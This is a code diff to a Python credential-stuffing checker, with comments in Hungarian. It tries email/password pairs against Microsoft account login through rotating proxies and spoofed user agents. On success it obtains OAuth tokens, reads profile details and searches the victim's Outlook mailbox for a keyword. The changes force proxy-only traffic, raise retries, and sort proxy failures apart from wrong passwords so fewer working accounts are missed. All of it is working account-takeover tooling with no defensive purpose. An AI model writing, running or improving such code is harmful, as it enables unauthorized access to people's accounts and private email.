@@ -8,8 +8,8 @@ from proxy_manager import proxy_manager
 
 _ua = UserAgent()
 
-PROXY_RETRIES = 3
-DIRECT_FALLBACK = True
+PROXY_RETRIES = 5
+DIRECT_FALLBACK = False  # KIKAPCSOLVA! Csak proxyval dolgozik!
 
 
 def generate_user_agent():
@@ -36,7 +36,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             finally:
                 session.close()
 
-            time.sleep(0.05)
+            time.sleep(0.1)
 
     if DIRECT_FALLBACK:
         session = requests.Session()
@@ -88,12 +88,14 @@ def _do_check(session, email, password, keyword):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
+        # ============ VÁLASZ ELLENŐRZÉS ============
         if len(response_text) < 1000:
             return {"status": "error", "reason": "Response too short"}
 
         if "PPFT" not in response_text and "urlPost" not in response_text and "login.live.com" not in response_text:
             return {"status": "error", "reason": "Not Microsoft page"}
 
+        # ============ PPFT & urlPost ============
         PPFT = ""
         urlPost = ""
 
@@ -129,8 +131,10 @@ def _do_check(session, email, password, keyword):
                 urlPost = urlpost_match.group(1)
 
         if not PPFT or not urlPost:
-            return {"status": "bad", "reason": "No PPFT/urlPost"}
+            # Nem találtuk → proxy torzította → retry
+            return {"status": "error", "reason": "No PPFT/urlPost"}
 
+        # ============ POST CREDENTIALS ============
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -178,11 +182,36 @@ def _do_check(session, email, password, keyword):
             allow_redirects=False, timeout=30
         )
 
+        # ============ VÁLASZ ELLENŐRZÉS ============
+        post_text = post_response.text if post_response.text else ""
         cookies_dict = session.cookies.get_dict()
 
-        if "__Host-MSAAUTHP" not in cookies_dict:
-            return {"status": "bad", "reason": "Wrong password"}
+        # Ha a POST válasz túl rövid vagy nem Microsoft → proxy hiba
+        if post_response.status_code >= 500:
+            return {"status": "error", "reason": f"Server error {post_response.status_code}"}
 
+        # ============ AUTH COOKIE ELLENŐRZÉS ============
+        if "__Host-MSAAUTHP" not in cookies_dict:
+            # FONTOS: Ellenőrizzük hogy VALÓBAN Microsoft válaszolt-e
+            # Ha igen → tényleg rossz jelszó (BAD)
+            # Ha nem → proxy torzította → retry (ERROR)
+
+            is_real_microsoft = (
+                "login.live.com" in post_text
+                or "PPFT" in post_text
+                or "sErrTxt" in post_text
+                or "urlPost" in post_text
+                or "recover?mkt" in post_text
+                or "Sign in" in post_text
+                or post_response.status_code in [200, 302]
+            )
+
+            if is_real_microsoft:
+                return {"status": "bad", "reason": "Wrong password"}
+            else:
+                return {"status": "error", "reason": "Post response not Microsoft"}
+
+        # ============ AUTH CODE ============
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
@@ -190,7 +219,7 @@ def _do_check(session, email, password, keyword):
                 auth_code = redirect_url.split('code=')[1].split('&')[0]
         else:
             redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
-            redirect_match = re.search(redirect_pattern, post_response.text)
+            redirect_match = re.search(redirect_pattern, post_text)
             if redirect_match:
                 redirect_url = redirect_match.group(1)
                 if 'msauth://' in redirect_url and 'code=' in redirect_url:
@@ -200,6 +229,7 @@ def _do_check(session, email, password, keyword):
         if CID:
             CID = CID.upper()
 
+        # ============ ACCESS TOKEN ============
         access_token = ""
         if auth_code:
             url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
@@ -224,8 +254,10 @@ def _do_check(session, email, password, keyword):
                 pass
 
         if not access_token or not CID:
-            return {"status": "bad", "reason": "No token"}
+            # Auth sikerült de token nem jött → hálózati hiba → retry
+            return {"status": "error", "reason": "No token after auth"}
 
+        # ============ PROFILE ============
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -263,6 +295,7 @@ def _do_check(session, email, password, keyword):
         except:
             pass
 
+        # ============ EMAIL SEARCH ============
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -348,6 +381,7 @@ def _do_check(session, email, password, keyword):
         except:
             pass
 
+        # ============ EREDMÉNY ============
         if Total != "0" and Total != "NO":
             return {
                 "status": "hit",
